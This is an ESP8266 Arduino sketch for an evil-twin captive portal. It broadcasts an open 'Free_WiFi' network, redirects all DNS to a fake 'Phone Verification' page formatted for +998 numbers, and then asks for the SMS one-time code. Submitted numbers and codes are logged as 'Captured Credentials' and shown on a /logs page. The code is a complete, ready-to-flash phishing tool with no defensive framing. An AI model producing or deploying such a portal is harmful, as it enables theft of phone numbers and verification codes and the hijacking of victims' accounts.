#include <ESP8266WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>

// --- Configuration ---
const char* AP_SSID = "Free_WiFi"; // The name of the fake Wi-Fi network
const IPAddress AP_IP(172, 20, 0, 1); // Less common private IP range
const byte DNS_PORT = 53;
const char* CREDENTIALS_FILE = "/credentials.txt";

// --- Web Server and DNS Server Objects ---
DNSServer dnsServer;
AsyncWebServer server(80);

// --- HTML Content for Phone Number Page ---
const char* PHONE_HTML = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>Phone Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
            color: #262626;
        }
        .main-container {
            width: 100%;
            max-width: 360px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .verification-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px 30px;
            text-align: center;
            border-radius: 4px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
        }
        .logo {
            width: 175px;
            height: 51px;
            margin: 0 auto 20px;
            display: block;
        }
        .instruction-text {
            font-size: 14px;
            color: #8e8e8e;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        input {
            width: calc(100% - 22px);
            padding: 11px;
            margin: 6px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
            font-size: 13px;
            background: #fafafa;
        }
        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #0095f6;
            border: none;
            color: white;
            font-weight: bold;
            font-size: 14px;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s ease;
        }
        button:hover {
            background: #007bb5;
        }
        button:disabled {
            background: #b2dffc;
            cursor: not-allowed;
        }
        #timer {
            font-size: 14px;
            color: #8e8e8e;
            margin-top: 10px;
        }
        .error-message {
            color: #ed4956;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="verification-box">
            <h1>Phone Verification</h1>
            <p class="instruction-text">Enter your phone number to receive a verification code</p>
            <form id="phoneForm" method='POST' action='/phone'>
                <input type="tel" name='phone' placeholder='+998 12 345 67 89' required pattern="\+998\s[0-9]{2}\s[0-9]{3}\s[0-9]{2}\s[0-9]{2}" title="Please enter a valid phone number in format: +998 12 345 67 89">
                <div class="error-message" id="phoneError">Please enter a valid phone number in format: +998 12 345 67 89</div>
                <button type='submit' id="sendButton">Send Code</button>
            </form>
            <div id="timer" style="display: none;"></div>
        </div>
    </div>
    <script>
        let countdown = 120; // 2 minutes in seconds
        let timerInterval;
        
        // Format phone number as user types
        document.querySelector('input[name="phone"]').addEventListener('input', function(e) {
            let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,2})(\d{0,3})(\d{0,2})(\d{0,2})/);
            if (x[1] && x[1].length === 3) {
                e.target.value = '+998 ' + (x[2] ? x[2] + ' ' : '') + (x[3] ? x[3] + ' ' : '') + (x[4] ? x[4] + ' ' : '') + x[5];
            } else if (x[1] && x[1].length > 0) {
                e.target.value = '+998 ' + x[1];
            }
        });
        
        document.getElementById('phoneForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const phoneInput = document.querySelector('input[name="phone"]');
            const phoneError = document.getElementById('phoneError');
            
            if (!phoneInput.checkValidity()) {
                phoneError.style.display = 'block';
                return;
            }
            
            phoneError.style.display = 'none';
            document.getElementById('sendButton').disabled = true;
            document.getElementById('timer').style.display = 'block';
            
            // Start countdown
            timerInterval = setInterval(updateTimer, 1000);
            
            // Submit the form
            this.submit();
        });
        
        function updateTimer() {
            const minutes = Math.floor(countdown / 60);
            const seconds = countdown % 60;
            document.getElementById('timer').textContent = 
                `Time remaining: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
            
            if (countdown <= 0) {
                clearInterval(timerInterval);
                document.getElementById('sendButton').disabled = false;
                document.getElementById('timer').style.display = 'none';
                countdown = 120;
            }
            countdown--;
        }
    </script>
</body>
</html>
)rawliteral";

// --- HTML Content for SMS Verification Page ---
const char* SMS_HTML = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>Enter Verification Code</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
            color: #262626;
        }
        .main-container {
            width: 100%;
            max-width: 360px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .verification-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px 30px;
            text-align: center;
            border-radius: 4px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
        }
        .instruction-text {
            font-size: 14px;
            color: #8e8e8e;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        input {
            width: calc(100% - 22px);
            padding: 11px;
            margin: 6px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
            font-size: 13px;
            background: #fafafa;
        }
        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #0095f6;
            border: none;
            color: white;
            font-weight: bold;
            font-size: 14px;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s ease;
        }
        button:hover {
            background: #007bb5;
        }
        .error-message {
            color: #ed4956;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="verification-box">
            <h1>Enter Verification Code</h1>
            <p class="instruction-text">Please enter the 6-digit code sent to your phone</p>
            <form method='POST' action='/verify'>
                <input type="text" name='code' placeholder='Enter 6-digit code' required pattern="[0-9]{6}" maxlength="6">
                <div class="error-message" id="codeError">Please enter a valid 6-digit code</div>
                <button type='submit'>Verify</button>
            </form>
        </div>
    </div>
</body>
</html>
)rawliteral";

// Function to save credentials
void saveCredentials(const String& phone, const String& code) {
  File file = LittleFS.open(CREDENTIALS_FILE, "a");
  if (!file) {
    Serial.println("[ERROR] Failed to open file for appending");
    return;
  }
  String logEntry = "Phone: " + phone + ", Code: " + code + "\n";
  if (file.print(logEntry)) {
    Serial.println("[*] Credentials saved to LittleFS.");
  } else {
    Serial.println("[ERROR] Failed to write to file.");
  }
  file.close();
}

void setup() {
  Serial.begin(115200);
  delay(500);

  Serial.println("\n--- Starting Phone Verification Portal ---");

  // Initialize LittleFS
  if (!LittleFS.begin()) {
    Serial.println("[ERROR] An Error has occurred while mounting LittleFS");
    return;
  }
  Serial.println("[*] LittleFS mounted successfully.");

  // Configure Wi-Fi in AP mode
  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID);
  WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
  delay(100);

  Serial.print("[*] Access Point Name: ");
  Serial.println(AP_SSID);
  Serial.print("[*] Access Point IP Address: ");
  Serial.println(WiFi.softAPIP());

  // Start DNS Server
  dnsServer.start(DNS_PORT, "*", AP_IP);
  Serial.println("[*] DNS Server Started");

  // Handle all requests (Captive Portal)
  server.onNotFound([](AsyncWebServerRequest *request) {
    Serial.print("[!] Client Connected: ");
    Serial.println(request->client()->remoteIP());
    request->send(200, "text/html", PHONE_HTML);
  });

  // Handle phone number submission
  server.on("/phone", HTTP_POST, [](AsyncWebServerRequest *request) {
    String phone = "";
    if (request->hasParam("phone", true)) {
      phone = request->getParam("phone", true)->value();
    }
    
    Serial.println("\n--- Captured Phone Number ---");
    Serial.print("Phone: ");
    Serial.println(phone);
    Serial.println("----------------------------");

    // Save phone number
    saveCredentials(phone, "pending");
    
    // Send SMS verification page
    request->send(200, "text/html", SMS_HTML);
  });

  // Handle SMS code verification
  server.on("/verify", HTTP_POST, [](AsyncWebServerRequest *request) {
    String phone = "";
    String code = "";
    
    if (request->hasParam("code", true)) {
      code = request->getParam("code", true)->value();
    }

    Serial.println("\n--- Captured Verification Code ---");
    Serial.print("Code: ");
    Serial.println(code);
    Serial.println("--------------------------------");

    // Save verification code
    saveCredentials(phone, code);
    
    // Send success page
    request->send(200, "text/html", "<h1>Verification Successful</h1><p>You can now connect to the WiFi network.</p>");
  });

  // Handle GET requests to /logs
  server.on("/logs", HTTP_GET, [](AsyncWebServerRequest *request) {
    Serial.println("[*] /logs requested by " + request->client()->remoteIP().toString());
    String content = "<h2>Captured Credentials</h2>";
    File file = LittleFS.open(CREDENTIALS_FILE, "r");
    if (!file) {
      content += "<p>No credentials captured yet or file not found.</p>";
      Serial.println("[INFO] Credentials file not found.");
    } else {
      content += "<pre>";
      while (file.available()) {
        content += file.readStringUntil('\n') + "\n";
      }
      content += "</pre>";
      file.close();
    }
    content += "<br><a href='/clear'>Clear Logs</a> | <a href='/'>Back to Verification Page</a>";
    request->send(200, "text/html", content);
  });

  // Handle GET requests to /clear
  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request) {
    Serial.println("[*] /clear requested by " + request->client()->remoteIP().toString());
    if (LittleFS.remove(CREDENTIALS_FILE)) {
      Serial.println("[*] Credentials file cleared.");
      request->send(200, "text/html", "<h2>Credentials Cleared</h2><p>The credentials log has been successfully cleared.</p><br><a href='/logs'>View Logs</a> | <a href='/'>Back to Verification Page</a>");
    } else {
      Serial.println("[ERROR] Failed to clear credentials file.");
      request->send(500, "text/html", "<h2>Error</h2><p>Failed to clear the credentials log.</p><br><a href='/logs'>View Logs</a> | <a href='/'>Back to Verification Page</a>");
    }
  });

  // Start the web server
  server.begin();
  Serial.println("[*] Web Server Started");
}

void loop() {
  dnsServer.processNextRequest();
} 